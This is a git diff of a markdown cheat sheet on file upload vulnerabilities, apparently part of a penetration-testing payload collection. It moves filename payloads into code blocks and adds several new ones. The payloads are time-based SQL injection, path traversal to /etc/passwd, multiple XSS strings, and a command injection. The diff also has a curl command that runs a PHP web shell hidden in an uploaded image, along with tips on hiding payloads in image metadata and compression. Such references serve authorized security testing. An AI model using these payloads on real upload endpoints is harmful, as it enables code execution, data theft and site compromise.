@@ -83,25 +83,33 @@ AAA<--SNIP 232 A-->AAA.php.png
 
 ```
 
-
-
-
-
-
-
-
-
-
-
-
 ## Filename vulnerabilities
 Sometimes the vulnerability is not the upload but how the file is handled after. You might want to upload files with payloads in the filename.
 
-* Time-Based SQLi Payloads: e.g. `poc.js'(select*from(select(sleep(20)))a)+'.extension`
-* LFI/Path Traversal Payloads: e.g. `image.png../../../../../../../etc/passwd`
-* XSS Payloads e.g. `'"><img src=x onerror=alert(document.domain)>.extension`
-* File Traversal e.g. `../../../tmp/lol.png`
-* Command Injection e.g. `; sleep 10;`
+* Time-Based SQLi Payloads:
+```html
+poc.js'(select*from(select(sleep(20)))a)+'.extension
+```
+* LFI/Path Traversal Payloads:
+```html
+image.png../../../../../../../etc/passwd
+```
+* XSS Payloads
+```html
+'"><img src=x onerror=alert(document.domain)>.extension
+<img src=x onerror=alert('XSS')>.png
+"><img src=x onerror=alert('XSS')>.png
+"><svg onmouseover=alert(1)>.svg
+<<script>alert('xss')<!--a-->a.png
+```
+* File Traversal
+```html
+../../../tmp/lol.png
+```
+* Command Injection
+```html
+; sleep 10;
+```
 
 Also you upload:
 
@@ -109,7 +117,10 @@ Also you upload:
 * EICAR file to check the presence of an antivirus
 
 ## Picture Compression
-Create valid pictures hosting PHP code. Upload the picture and use a Local File Inclusion to execute the code. The shell can be called with the following command : `curl 'http://localhost/test.php?0=system' --data "1='ls'"`.
+Create valid pictures hosting PHP code. Upload the picture and use a Local File Inclusion to execute the code. The shell can be called with the following command
+```bash
+curl 'http://localhost/test.php?0=system' --data "1='ls'"
+```
 
 * Picture Metadata, hide the payload inside a comment tag in the metadata.
 * Picture Resize, hide the payload within the compression algorithm in order to bypass a resize. Also defeating getimagesize() and imagecreatefromgif().
